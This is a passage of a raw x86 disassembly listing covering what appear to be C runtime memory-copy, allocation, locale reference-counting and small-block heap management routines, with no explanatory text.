  424860:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  424864:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  424868:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42486c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  424870:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  424874:	lea    eax,[ecx*4+0x0]
  42487b:	add    esi,eax
  42487d:	add    edi,eax
  42487f:	jmp    DWORD PTR [edx*4+0x424888]
  424886:	mov    edi,edi
  424888:	cwde   
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [eax-0x4fffbdb8],ah
  424891:	dec    eax
  424892:	inc    edx
  424893:	add    ah,al
  424895:	dec    eax
  424896:	inc    edx
  424897:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42489d:	leave  
  42489e:	ret    
  42489f:	nop
  4248a0:	mov    al,BYTE PTR [esi+0x3]
  4248a3:	mov    BYTE PTR [edi+0x3],al
  4248a6:	mov    eax,DWORD PTR [ebp+0x8]
  4248a9:	pop    esi
  4248aa:	pop    edi
  4248ab:	leave  
  4248ac:	ret    
  4248ad:	lea    ecx,[ecx+0x0]
  4248b0:	mov    al,BYTE PTR [esi+0x3]
  4248b3:	mov    BYTE PTR [edi+0x3],al
  4248b6:	mov    al,BYTE PTR [esi+0x2]
  4248b9:	mov    BYTE PTR [edi+0x2],al
  4248bc:	mov    eax,DWORD PTR [ebp+0x8]
  4248bf:	pop    esi
  4248c0:	pop    edi
  4248c1:	leave  
  4248c2:	ret    
  4248c3:	nop
  4248c4:	mov    al,BYTE PTR [esi+0x3]
  4248c7:	mov    BYTE PTR [edi+0x3],al
  4248ca:	mov    al,BYTE PTR [esi+0x2]
  4248cd:	mov    BYTE PTR [edi+0x2],al
  4248d0:	mov    al,BYTE PTR [esi+0x1]
  4248d3:	mov    BYTE PTR [edi+0x1],al
  4248d6:	mov    eax,DWORD PTR [ebp+0x8]
  4248d9:	pop    esi
  4248da:	pop    edi
  4248db:	leave  
  4248dc:	ret    
  4248dd:	push   DWORD PTR [esp+0x4]
  4248e1:	call   DWORD PTR ds:0x4280a8
  4248e7:	xor    eax,eax
  4248e9:	inc    eax
  4248ea:	ret    0x8
  4248ed:	push   0x10
  4248ef:	push   0x4285b8
  4248f4:	call   0x423858
  4248f9:	mov    eax,ds:0x45cd88
  4248fe:	test   eax,eax
  424900:	jne    0x424939
  424902:	cmp    DWORD PTR ds:0x45cac4,0x1
  424909:	je     0x42492f
  42490b:	push   0x4285a4
  424910:	call   DWORD PTR ds:0x428014
  424916:	test   eax,eax
  424918:	je     0x42492f
  42491a:	push   0x42857c
  42491f:	push   eax
  424920:	call   DWORD PTR ds:0x428018
  424926:	mov    ds:0x45cd88,eax
  42492b:	test   eax,eax
  42492d:	jne    0x424939
  42492f:	mov    eax,0x4248dd
  424934:	mov    ds:0x45cd88,eax
  424939:	and    DWORD PTR [ebp-0x4],0x0
  42493d:	push   DWORD PTR [ebp+0xc]
  424940:	push   DWORD PTR [ebp+0x8]
  424943:	call   eax
  424945:	mov    DWORD PTR [ebp-0x1c],eax
  424948:	jmp    0x42496e
  42494a:	mov    eax,DWORD PTR [ebp-0x14]
  42494d:	mov    eax,DWORD PTR [eax]
  42494f:	mov    eax,DWORD PTR [eax]
  424951:	mov    DWORD PTR [ebp-0x20],eax
  424954:	xor    eax,eax
  424956:	inc    eax
  424957:	ret    
  424958:	mov    esp,DWORD PTR [ebp-0x18]
  42495b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  424962:	jne    0x42496c
  424964:	push   0x8
  424966:	call   DWORD PTR ds:0x428068
  42496c:	xor    eax,eax
  42496e:	or     DWORD PTR [ebp-0x4],0xffffffff
  424972:	call   0x423893
  424977:	ret    
  424978:	push   0x10
  42497a:	push   0x4285c8
  42497f:	call   0x423858
  424984:	mov    esi,DWORD PTR [ebp+0x8]
  424987:	imul   esi,DWORD PTR [ebp+0xc]
  42498b:	mov    DWORD PTR [ebp-0x1c],esi
  42498e:	test   esi,esi
  424990:	jne    0x424993
  424992:	inc    esi
  424993:	xor    edi,edi
  424995:	mov    DWORD PTR [ebp-0x20],edi
  424998:	cmp    esi,0xffffffe0
  42499b:	ja     0x424a02
  42499d:	cmp    DWORD PTR ds:0x45d144,0x3
  4249a4:	jne    0x4249ed
  4249a6:	add    esi,0xf
  4249a9:	and    esi,0xfffffff0
  4249ac:	mov    DWORD PTR [ebp+0xc],esi
  4249af:	mov    ebx,DWORD PTR [ebp-0x1c]
  4249b2:	cmp    ebx,DWORD PTR ds:0x45cf04
  4249b8:	ja     0x4249ed
  4249ba:	push   0x4
  4249bc:	call   0x423a1f
  4249c1:	pop    ecx
  4249c2:	and    DWORD PTR [ebp-0x4],edi
  4249c5:	push   ebx
  4249c6:	call   0x425421
  4249cb:	pop    ecx
  4249cc:	mov    DWORD PTR [ebp-0x20],eax
  4249cf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249d3:	call   0x424a22
  4249d8:	mov    edi,DWORD PTR [ebp-0x20]
  4249db:	test   edi,edi
  4249dd:	je     0x4249f1
  4249df:	push   DWORD PTR [ebp-0x1c]
  4249e2:	push   0x0
  4249e4:	push   edi
  4249e5:	call   0x426160
  4249ea:	add    esp,0xc
  4249ed:	test   edi,edi
  4249ef:	jne    0x424a2b
  4249f1:	push   esi
  4249f2:	push   0x8
  4249f4:	push   DWORD PTR ds:0x45d140
  4249fa:	call   DWORD PTR ds:0x4280a4
  424a00:	mov    edi,eax
  424a02:	test   edi,edi
  424a04:	jne    0x424a2b
  424a06:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a0c:	je     0x424a2b
  424a0e:	push   esi
  424a0f:	call   0x426142
  424a14:	pop    ecx
  424a15:	test   eax,eax
  424a17:	jne    0x424993
  424a1d:	jmp    0x424a2d
  424a1f:	mov    esi,DWORD PTR [ebp+0xc]
  424a22:	push   0x4
  424a24:	call   0x42398b
  424a29:	pop    ecx
  424a2a:	ret    
  424a2b:	mov    eax,edi
  424a2d:	call   0x423893
  424a32:	ret    
  424a33:	push   esi
  424a34:	mov    esi,DWORD PTR [esp+0x8]
  424a38:	mov    eax,DWORD PTR [esi+0x3c]
  424a3b:	push   edi
  424a3c:	xor    edi,edi
  424a3e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a44:	je     0x424aa9
  424a46:	cmp    eax,edi
  424a48:	je     0x424aa9
  424a4a:	mov    eax,DWORD PTR [esi+0x2c]
  424a4d:	cmp    DWORD PTR [eax],edi
  424a4f:	jne    0x424aa9
  424a51:	mov    eax,DWORD PTR [esi+0x34]
  424a54:	cmp    eax,edi
  424a56:	je     0x424a74
  424a58:	cmp    DWORD PTR [eax],edi
  424a5a:	jne    0x424a74
  424a5c:	cmp    eax,DWORD PTR ds:0x45cef0
  424a62:	je     0x424a74
  424a64:	push   eax
  424a65:	call   0x42446a
  424a6a:	push   DWORD PTR [esi+0x3c]
  424a6d:	call   0x4263af
  424a72:	pop    ecx
  424a73:	pop    ecx
  424a74:	mov    eax,DWORD PTR [esi+0x30]
  424a77:	cmp    eax,edi
  424a79:	je     0x424a97
  424a7b:	cmp    DWORD PTR [eax],edi
  424a7d:	jne    0x424a97
  424a7f:	cmp    eax,DWORD PTR ds:0x45cef4
  424a85:	je     0x424a97
  424a87:	push   eax
  424a88:	call   0x42446a
  424a8d:	push   DWORD PTR [esi+0x3c]
  424a90:	call   0x426350
  424a95:	pop    ecx
  424a96:	pop    ecx
  424a97:	push   DWORD PTR [esi+0x2c]
  424a9a:	call   0x42446a
  424a9f:	push   DWORD PTR [esi+0x3c]
  424aa2:	call   0x42446a
  424aa7:	pop    ecx
  424aa8:	pop    ecx
  424aa9:	mov    eax,DWORD PTR [esi+0x40]
  424aac:	cmp    eax,DWORD PTR ds:0x45ceec
  424ab2:	je     0x424acc
  424ab4:	cmp    eax,edi
  424ab6:	je     0x424acc
  424ab8:	cmp    DWORD PTR [eax],edi
  424aba:	jne    0x424acc
  424abc:	push   eax
  424abd:	call   0x42446a
  424ac2:	push   DWORD PTR [esi+0x44]
  424ac5:	call   0x42446a
  424aca:	pop    ecx
  424acb:	pop    ecx
  424acc:	mov    eax,DWORD PTR [esi+0x50]
  424acf:	cmp    eax,DWORD PTR ds:0x45cdd0
  424ad5:	je     0x424af3
  424ad7:	cmp    eax,edi
  424ad9:	je     0x424af3
  424adb:	cmp    DWORD PTR [eax+0xb4],edi
  424ae1:	jne    0x424af3
  424ae3:	push   eax
  424ae4:	call   0x4261c0
  424ae9:	push   DWORD PTR [esi+0x50]
  424aec:	call   0x42446a
  424af1:	pop    ecx
  424af2:	pop    ecx
  424af3:	push   esi
  424af4:	call   0x42446a
  424af9:	pop    ecx
  424afa:	pop    edi
  424afb:	pop    esi
  424afc:	ret    
  424afd:	push   esi
  424afe:	call   0x42370d
  424b03:	mov    esi,eax
  424b05:	mov    eax,DWORD PTR [esi+0x64]
  424b08:	cmp    eax,DWORD PTR ds:0x45c58c
  424b0e:	je     0x424bba
  424b14:	test   eax,eax
  424b16:	je     0x424b47
  424b18:	mov    ecx,DWORD PTR [eax+0x2c]
  424b1b:	dec    DWORD PTR [eax]
  424b1d:	test   ecx,ecx
  424b1f:	je     0x424b23
  424b21:	dec    DWORD PTR [ecx]
  424b23:	mov    ecx,DWORD PTR [eax+0x34]
  424b26:	test   ecx,ecx
  424b28:	je     0x424b2c
  424b2a:	dec    DWORD PTR [ecx]
  424b2c:	mov    ecx,DWORD PTR [eax+0x30]
  424b2f:	test   ecx,ecx
  424b31:	je     0x424b35
  424b33:	dec    DWORD PTR [ecx]
  424b35:	mov    ecx,DWORD PTR [eax+0x40]
  424b38:	test   ecx,ecx
  424b3a:	je     0x424b3e
  424b3c:	dec    DWORD PTR [ecx]
  424b3e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b41:	dec    DWORD PTR [ecx+0xb4]
  424b47:	mov    ecx,DWORD PTR ds:0x45c58c
  424b4d:	mov    DWORD PTR [esi+0x64],ecx
  424b50:	mov    ecx,DWORD PTR ds:0x45c58c
  424b56:	inc    DWORD PTR [ecx]
  424b58:	mov    ecx,DWORD PTR ds:0x45c58c
  424b5e:	mov    ecx,DWORD PTR [ecx+0x2c]
  424b61:	test   ecx,ecx
  424b63:	je     0x424b67
  424b65:	inc    DWORD PTR [ecx]
  424b67:	mov    ecx,DWORD PTR ds:0x45c58c
  424b6d:	mov    ecx,DWORD PTR [ecx+0x34]
  424b70:	test   ecx,ecx
  424b72:	je     0x424b76
  424b74:	inc    DWORD PTR [ecx]
  424b76:	mov    ecx,DWORD PTR ds:0x45c58c
  424b7c:	mov    ecx,DWORD PTR [ecx+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	inc    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR ds:0x45c58c
  424b8b:	mov    ecx,DWORD PTR [ecx+0x40]
  424b8e:	test   ecx,ecx
  424b90:	je     0x424b94
  424b92:	inc    DWORD PTR [ecx]
  424b94:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9a:	mov    ecx,DWORD PTR [ecx+0x4c]
  424b9d:	inc    DWORD PTR [ecx+0xb4]
  424ba3:	test   eax,eax
  424ba5:	je     0x424bba
  424ba7:	cmp    DWORD PTR [eax],0x0
  424baa:	jne    0x424bba
  424bac:	cmp    eax,0x45c538
  424bb1:	je     0x424bba
  424bb3:	push   eax
  424bb4:	call   0x424a33
  424bb9:	pop    ecx
  424bba:	mov    eax,DWORD PTR [esi+0x64]
  424bbd:	pop    esi
  424bbe:	ret    
  424bbf:	push   0xc
  424bc1:	push   0x428758
  424bc6:	call   0x423858
  424bcb:	push   0xc
  424bcd:	call   0x423a1f
  424bd2:	pop    ecx
  424bd3:	and    DWORD PTR [ebp-0x4],0x0
  424bd7:	call   0x424afd
  424bdc:	mov    DWORD PTR [ebp-0x1c],eax
  424bdf:	or     DWORD PTR [ebp-0x4],0xffffffff
  424be3:	call   0x424bf1
  424be8:	mov    eax,DWORD PTR [ebp-0x1c]
  424beb:	call   0x423893
  424bf0:	ret    
  424bf1:	push   0xc
  424bf3:	call   0x42398b
  424bf8:	pop    ecx
  424bf9:	ret    
  424bfa:	push   0x140
  424bff:	push   0x0
  424c01:	push   DWORD PTR ds:0x45d140
  424c07:	call   DWORD PTR ds:0x4280a4
  424c0d:	test   eax,eax
  424c0f:	mov    ds:0x45cf00,eax
  424c14:	jne    0x424c17
  424c16:	ret    
  424c17:	mov    ecx,DWORD PTR [esp+0x4]
  424c1b:	and    DWORD PTR ds:0x45cef8,0x0
  424c22:	and    DWORD PTR ds:0x45cefc,0x0
  424c29:	mov    ds:0x45cf08,eax
  424c2e:	xor    eax,eax
  424c30:	mov    DWORD PTR ds:0x45cf04,ecx
  424c36:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c40:	inc    eax
  424c41:	ret    
  424c42:	mov    eax,ds:0x45cefc
  424c47:	lea    ecx,[eax+eax*4]
  424c4a:	mov    eax,ds:0x45cf00
  424c4f:	lea    ecx,[eax+ecx*4]
  424c52:	jmp    0x424c66
  424c54:	mov    edx,DWORD PTR [esp+0x4]
  424c58:	sub    edx,DWORD PTR [eax+0xc]
  424c5b:	cmp    edx,0x100000
  424c61:	jb     0x424c6c
  424c63:	add    eax,0x14
  424c66:	cmp    eax,ecx
  424c68:	jb     0x424c54
  424c6a:	xor    eax,eax
  424c6c:	ret    
  424c6d:	push   ebp
  424c6e:	mov    ebp,esp
  424c70:	sub    esp,0x10
  424c73:	mov    ecx,DWORD PTR [ebp+0x8]
  424c76:	mov    eax,DWORD PTR [ecx+0x10]
  424c79:	push   esi
  424c7a:	mov    esi,DWORD PTR [ebp+0xc]
  424c7d:	push   edi
  424c7e:	mov    edi,esi
  424c80:	sub    edi,DWORD PTR [ecx+0xc]
  424c83:	add    esi,0xfffffffc
  424c86:	shr    edi,0xf
  424c89:	mov    ecx,edi
  424c8b:	imul   ecx,ecx,0x204
  424c91:	lea    ecx,[ecx+eax*1+0x144]
  424c98:	mov    DWORD PTR [ebp-0x10],ecx
  424c9b:	mov    ecx,DWORD PTR [esi]
  424c9d:	dec    ecx
  424c9e:	test   cl,0x1
  424ca1:	mov    DWORD PTR [ebp-0x4],ecx
  424ca4:	jne    0x424f81
  424caa:	push   ebx
  424cab:	lea    ebx,[ecx+esi*1]
  424cae:	mov    edx,DWORD PTR [ebx]
  424cb0:	mov    DWORD PTR [ebp-0xc],edx
  424cb3:	mov    edx,DWORD PTR [esi-0x4]
  424cb6:	mov    DWORD PTR [ebp-0x8],edx
  424cb9:	mov    edx,DWORD PTR [ebp-0xc]
  424cbc:	test   dl,0x1
  424cbf:	mov    DWORD PTR [ebp+0xc],ebx
  424cc2:	jne    0x424d38
  424cc4:	sar    edx,0x4
  424cc7:	dec    edx
  424cc8:	cmp    edx,0x3f
  424ccb:	jbe    0x424cd0
  424ccd:	push   0x3f
  424ccf:	pop    edx
  424cd0:	mov    ecx,DWORD PTR [ebx+0x4]
  424cd3:	cmp    ecx,DWORD PTR [ebx+0x8]
  424cd6:	jne    0x424d1a
  424cd8:	cmp    edx,0x20
  424cdb:	mov    ebx,0x80000000
  424ce0:	jae    0x424cfb
  424ce2:	mov    ecx,edx
  424ce4:	shr    ebx,cl
  424ce6:	lea    ecx,[edx+eax*1+0x4]
  424cea:	not    ebx
  424cec:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424cf0:	dec    BYTE PTR [ecx]
  424cf2:	jne    0x424d17
  424cf4:	mov    ecx,DWORD PTR [ebp+0x8]
  424cf7:	and    DWORD PTR [ecx],ebx
  424cf9:	jmp    0x424d17
  424cfb:	lea    ecx,[edx-0x20]
  424cfe:	shr    ebx,cl
  424d00:	lea    ecx,[edx+eax*1+0x4]
  424d04:	not    ebx
  424d06:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d0d:	dec    BYTE PTR [ecx]
  424d0f:	jne    0x424d17
  424d11:	mov    ecx,DWORD PTR [ebp+0x8]
  424d14:	and    DWORD PTR [ecx+0x4],ebx
  424d17:	mov    ebx,DWORD PTR [ebp+0xc]
  424d1a:	mov    edx,DWORD PTR [ebx+0x8]
  424d1d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d20:	mov    ecx,DWORD PTR [ebp-0x4]
  424d23:	add    ecx,DWORD PTR [ebp-0xc]
  424d26:	mov    DWORD PTR [edx+0x4],ebx
  424d29:	mov    edx,DWORD PTR [ebp+0xc]
  424d2c:	mov    ebx,DWORD PTR [edx+0x4]
  424d2f:	mov    edx,DWORD PTR [edx+0x8]
  424d32:	mov    DWORD PTR [ebx+0x8],edx
  424d35:	mov    DWORD PTR [ebp-0x4],ecx
  424d38:	mov    edx,ecx
  424d3a:	sar    edx,0x4
  424d3d:	dec    edx
  424d3e:	cmp    edx,0x3f
  424d41:	jbe    0x424d46
  424d43:	push   0x3f
  424d45:	pop    edx
  424d46:	mov    ebx,DWORD PTR [ebp-0x8]
  424d49:	and    ebx,0x1
  424d4c:	mov    DWORD PTR [ebp-0xc],ebx
  424d4f:	jne    0x424de4
  424d55:	sub    esi,DWORD PTR [ebp-0x8]
  424d58:	mov    ebx,DWORD PTR [ebp-0x8]
  424d5b:	sar    ebx,0x4
  424d5e:	push   0x3f
  424d60:	mov    DWORD PTR [ebp+0xc],esi
  424d63:	dec    ebx
  424d64:	pop    esi
  424d65:	cmp    ebx,esi
  424d67:	jbe    0x424d6b
  424d69:	mov    ebx,esi
  424d6b:	add    ecx,DWORD PTR [ebp-0x8]
  424d6e:	mov    edx,ecx
  424d70:	sar    edx,0x4
  424d73:	dec    edx
  424d74:	cmp    edx,esi
  424d76:	mov    DWORD PTR [ebp-0x4],ecx
  424d79:	jbe    0x424d7d
  424d7b:	mov    edx,esi
  424d7d:	cmp    ebx,edx
  424d7f:	je     0x424ddf
  424d81:	mov    ecx,DWORD PTR [ebp+0xc]
  424d84:	mov    esi,DWORD PTR [ecx+0x4]
  424d87:	cmp    esi,DWORD PTR [ecx+0x8]
  424d8a:	jne    0x424dc7
  424d8c:	cmp    ebx,0x20
  424d8f:	mov    esi,0x80000000
  424d94:	jae    0x424dad
  424d96:	mov    ecx,ebx
  424d98:	shr    esi,cl
  424d9a:	not    esi
  424d9c:	and    DWORD PTR [eax+edi*4+0x44],esi
  424da0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424da4:	jne    0x424dc7
  424da6:	mov    ecx,DWORD PTR [ebp+0x8]
  424da9:	and    DWORD PTR [ecx],esi
  424dab:	jmp    0x424dc7
  424dad:	lea    ecx,[ebx-0x20]
  424db0:	shr    esi,cl
  424db2:	not    esi
  424db4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424dbb:	dec    BYTE PTR [ebx+eax*1+0x4]
  424dbf:	jne    0x424dc7
  424dc1:	mov    ecx,DWORD PTR [ebp+0x8]
  424dc4:	and    DWORD PTR [ecx+0x4],esi
  424dc7:	mov    ecx,DWORD PTR [ebp+0xc]
  424dca:	mov    esi,DWORD PTR [ecx+0x8]
  424dcd:	mov    ecx,DWORD PTR [ecx+0x4]
  424dd0:	mov    DWORD PTR [esi+0x4],ecx
  424dd3:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd6:	mov    esi,DWORD PTR [ecx+0x4]
  424dd9:	mov    ecx,DWORD PTR [ecx+0x8]
  424ddc:	mov    DWORD PTR [esi+0x8],ecx
  424ddf:	mov    esi,DWORD PTR [ebp+0xc]
  424de2:	jmp    0x424de7
  424de4:	mov    ebx,DWORD PTR [ebp+0x8]
  424de7:	cmp    DWORD PTR [ebp-0xc],0x0
  424deb:	jne    0x424df5
  424ded:	cmp    ebx,edx
  424def:	je     0x424e75
  424df5:	mov    ecx,DWORD PTR [ebp-0x10]
  424df8:	lea    ecx,[ecx+edx*8]
  424dfb:	mov    ebx,DWORD PTR [ecx+0x4]
  424dfe:	mov    DWORD PTR [esi+0x8],ecx
  424e01:	mov    DWORD PTR [esi+0x4],ebx
  424e04:	mov    DWORD PTR [ecx+0x4],esi
  424e07:	mov    ecx,DWORD PTR [esi+0x4]
  424e0a:	mov    DWORD PTR [ecx+0x8],esi
  424e0d:	mov    ecx,DWORD PTR [esi+0x4]
  424e10:	cmp    ecx,DWORD PTR [esi+0x8]
  424e13:	jne    0x424e75
  424e15:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e19:	mov    BYTE PTR [ebp+0xf],cl
  424e1c:	inc    cl
  424e1e:	cmp    edx,0x20
  424e21:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e25:	jae    0x424e4c
  424e27:	cmp    BYTE PTR [ebp+0xf],0x0
  424e2b:	jne    0x424e3b
  424e2d:	mov    ecx,edx
  424e2f:	mov    ebx,0x80000000
  424e34:	shr    ebx,cl
  424e36:	mov    ecx,DWORD PTR [ebp+0x8]
  424e39:	or     DWORD PTR [ecx],ebx
  424e3b:	mov    ebx,0x80000000
  424e40:	mov    ecx,edx
  424e42:	shr    ebx,cl
  424e44:	lea    eax,[eax+edi*4+0x44]
  424e48:	or     DWORD PTR [eax],ebx
  424e4a:	jmp    0x424e75
  424e4c:	cmp    BYTE PTR [ebp+0xf],0x0
  424e50:	jne    0x424e62
  424e52:	lea    ecx,[edx-0x20]
  424e55:	mov    ebx,0x80000000
  424e5a:	shr    ebx,cl
  424e5c:	mov    ecx,DWORD PTR [ebp+0x8]
  424e5f:	or     DWORD PTR [ecx+0x4],ebx
  424e62:	lea    ecx,[edx-0x20]
  424e65:	mov    edx,0x80000000
  424e6a:	shr    edx,cl
  424e6c:	lea    eax,[eax+edi*4+0xc4]
  424e73:	or     DWORD PTR [eax],edx
  424e75:	mov    eax,DWORD PTR [ebp-0x4]
  424e78:	mov    DWORD PTR [esi],eax
  424e7a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424e7e:	mov    eax,DWORD PTR [ebp-0x10]
  424e81:	dec    DWORD PTR [eax]
  424e83:	jne    0x424f80
  424e89:	mov    eax,ds:0x45cef8
  424e8e:	test   eax,eax
  424e90:	je     0x424f72
  424e96:	mov    ecx,DWORD PTR ds:0x45cf10
  424e9c:	mov    esi,DWORD PTR ds:0x428084
  424ea2:	push   0x4000
  424ea7:	shl    ecx,0xf
  424eaa:	add    ecx,DWORD PTR [eax+0xc]
  424ead:	mov    ebx,0x8000
  424eb2:	push   ebx
  424eb3:	push   ecx
  424eb4:	call   esi
  424eb6:	mov    ecx,DWORD PTR ds:0x45cf10
  424ebc:	mov    eax,ds:0x45cef8
  424ec1:	mov    edx,0x80000000
  424ec6:	shr    edx,cl
  424ec8:	or     DWORD PTR [eax+0x8],edx
  424ecb:	mov    eax,ds:0x45cef8
  424ed0:	mov    eax,DWORD PTR [eax+0x10]
  424ed3:	mov    ecx,DWORD PTR ds:0x45cf10
  424ed9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424ee1:	mov    eax,ds:0x45cef8
  424ee6:	mov    eax,DWORD PTR [eax+0x10]
  424ee9:	dec    BYTE PTR [eax+0x43]
  424eec:	mov    eax,ds:0x45cef8
  424ef1:	mov    ecx,DWORD PTR [eax+0x10]
  424ef4:	cmp    BYTE PTR [ecx+0x43],0x0
  424ef8:	jne    0x424f03
  424efa:	and    DWORD PTR [eax+0x4],0xfffffffe
  424efe:	mov    eax,ds:0x45cef8
  424f03:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f07:	jne    0x424f72
  424f09:	push   ebx
  424f0a:	push   0x0
  424f0c:	push   DWORD PTR [eax+0xc]
  424f0f:	call   esi
  424f11:	mov    eax,ds:0x45cef8
  424f16:	push   DWORD PTR [eax+0x10]
  424f19:	push   0x0
  424f1b:	push   DWORD PTR ds:0x45d140
  424f21:	call   DWORD PTR ds:0x428088
  424f27:	mov    eax,ds:0x45cefc
  424f2c:	mov    edx,DWORD PTR ds:0x45cf00
  424f32:	lea    eax,[eax+eax*4]
  424f35:	shl    eax,0x2
  424f38:	mov    ecx,eax
  424f3a:	mov    eax,ds:0x45cef8
  424f3f:	sub    ecx,eax
  424f41:	lea    ecx,[ecx+edx*1-0x14]
  424f45:	push   ecx
  424f46:	lea    ecx,[eax+0x14]
  424f49:	push   ecx
  424f4a:	push   eax
  424f4b:	call   0x4267a0
  424f50:	mov    eax,DWORD PTR [ebp+0x8]
  424f53:	add    esp,0xc
  424f56:	dec    DWORD PTR ds:0x45cefc
  424f5c:	cmp    eax,DWORD PTR ds:0x45cef8
  424f62:	jbe    0x424f68
  424f64:	sub    DWORD PTR [ebp+0x8],0x14
  424f68:	mov    eax,ds:0x45cf00
  424f6d:	mov    ds:0x45cf08,eax
  424f72:	mov    eax,DWORD PTR [ebp+0x8]
  424f75:	mov    ds:0x45cef8,eax
  424f7a:	mov    DWORD PTR ds:0x45cf10,edi
  424f80:	pop    ebx
  424f81:	pop    edi
  424f82:	pop    esi
  424f83:	leave  
  424f84:	ret    
  424f85:	mov    eax,ds:0x45cefc
  424f8a:	mov    ecx,DWORD PTR ds:0x45cf0c
  424f90:	push   edi
  424f91:	xor    edi,edi
  424f93:	cmp    eax,ecx
  424f95:	jne    0x424fcb
  424f97:	lea    eax,[ecx+ecx*4+0x50]
  424f9b:	shl    eax,0x2
  424f9e:	push   eax
  424f9f:	push   DWORD PTR ds:0x45cf00
  424fa5:	push   edi
  424fa6:	push   DWORD PTR ds:0x45d140
  424fac:	call   DWORD PTR ds:0x4280b0
  424fb2:	cmp    eax,edi
  424fb4:	jne    0x424fba
  424fb6:	xor    eax,eax
  424fb8:	pop    edi
  424fb9:	ret    
  424fba:	add    DWORD PTR ds:0x45cf0c,0x10
  424fc1:	mov    ds:0x45cf00,eax
  424fc6:	mov    eax,ds:0x45cefc
  424fcb:	mov    ecx,DWORD PTR ds:0x45cf00
  424fd1:	push   esi
  424fd2:	push   0x41c4
  424fd7:	push   0x8
  424fd9:	push   DWORD PTR ds:0x45d140
  424fdf:	lea    eax,[eax+eax*4]
  424fe2:	lea    esi,[ecx+eax*4]
  424fe5:	call   DWORD PTR ds:0x4280a4
  424feb:	cmp    eax,edi
  424fed:	mov    DWORD PTR [esi+0x10],eax
  424ff0:	jne    0x424ff6
  424ff2:	xor    eax,eax
  424ff4:	jmp    0x425039
  424ff6:	push   0x4
  424ff8:	push   0x2000
  424ffd:	push   0x100000
  425002:	push   edi
  425003:	call   DWORD PTR ds:0x4280ac
  425009:	cmp    eax,edi
  42500b:	mov    DWORD PTR [esi+0xc],eax
  42500e:	jne    0x425022
  425010:	push   DWORD PTR [esi+0x10]
  425013:	push   edi
  425014:	push   DWORD PTR ds:0x45d140
  42501a:	call   DWORD PTR ds:0x428088
  425020:	jmp    0x424ff2
  425022:	or     DWORD PTR [esi+0x8],0xffffffff
  425026:	mov    DWORD PTR [esi],edi
  425028:	mov    DWORD PTR [esi+0x4],edi
  42502b:	inc    DWORD PTR ds:0x45cefc
  425031:	mov    eax,DWORD PTR [esi+0x10]
  425034:	or     DWORD PTR [eax],0xffffffff
  425037:	mov    eax,esi
  425039:	pop    esi
  42503a:	pop    edi
  42503b:	ret    
  42503c:	push   ebp
  42503d:	mov    ebp,esp
  42503f:	push   ecx
  425040:	push   ecx
  425041:	mov    ecx,DWORD PTR [ebp+0x8]
  425044:	mov    eax,DWORD PTR [ecx+0x8]
  425047:	push   ebx
  425048:	push   esi
  425049:	mov    esi,DWORD PTR [ecx+0x10]
  42504c:	push   edi
  42504d:	xor    ebx,ebx
  42504f:	jmp    0x425054
  425051:	shl    eax,1
  425053:	inc    ebx
  425054:	test   eax,eax
  425056:	jge    0x425051
  425058:	mov    eax,ebx
  42505a:	imul   eax,eax,0x204
  425060:	lea    eax,[eax+esi*1+0x144]
  425067:	push   0x3f
  425069:	mov    DWORD PTR [ebp-0x8],eax
  42506c:	pop    edx
  42506d:	mov    DWORD PTR [eax+0x8],eax
  425070:	mov    DWORD PTR [eax+0x4],eax
  425073:	add    eax,0x8
  425076:	dec    edx
  425077:	jne    0x42506d
  425079:	push   0x4
  42507b:	mov    edi,ebx
  42507d:	push   0x1000
  425082:	shl    edi,0xf
  425085:	add    edi,DWORD PTR [ecx+0xc]
  425088:	push   0x8000
  42508d:	push   edi
  42508e:	call   DWORD PTR ds:0x4280ac
  425094:	test   eax,eax
  425096:	jne    0x4250a0
  425098:	or     eax,0xffffffff
  42509b:	jmp    0x42513d
  4250a0:	lea    edx,[edi+0x7000]
  4250a6:	cmp    edi,edx
  4250a8:	mov    DWORD PTR [ebp-0x4],edx
  4250ab:	ja     0x4250f0
  4250ad:	mov    ecx,edx
  4250af:	sub    ecx,edi
  4250b1:	shr    ecx,0xc
  4250b4:	lea    eax,[edi+0x10]
  4250b7:	inc    ecx
  4250b8:	or     DWORD PTR [eax-0x8],0xffffffff
  4250bc:	or     DWORD PTR [eax+0xfec],0xffffffff
  4250c3:	lea    edx,[eax+0xffc]
  4250c9:	mov    DWORD PTR [eax],edx
  4250cb:	lea    edx,[eax-0x1004]
  4250d1:	mov    DWORD PTR [eax-0x4],0xff0
  4250d8:	mov    DWORD PTR [eax+0x4],edx
  4250db:	mov    DWORD PTR [eax+0xfe8],0xff0
  4250e5:	add    eax,0x1000
  4250ea:	dec    ecx
  4250eb:	jne    0x4250b8
  4250ed:	mov    edx,DWORD PTR [ebp-0x4]
  4250f0:	mov    eax,DWORD PTR [ebp-0x8]
  4250f3:	add    eax,0x1f8
  4250f8:	lea    ecx,[edi+0xc]
  4250fb:	mov    DWORD PTR [eax+0x4],ecx
  4250fe:	mov    DWORD PTR [ecx+0x8],eax
  425101:	lea    ecx,[edx+0xc]
  425104:	mov    DWORD PTR [eax+0x8],ecx
  425107:	mov    DWORD PTR [ecx+0x4],eax
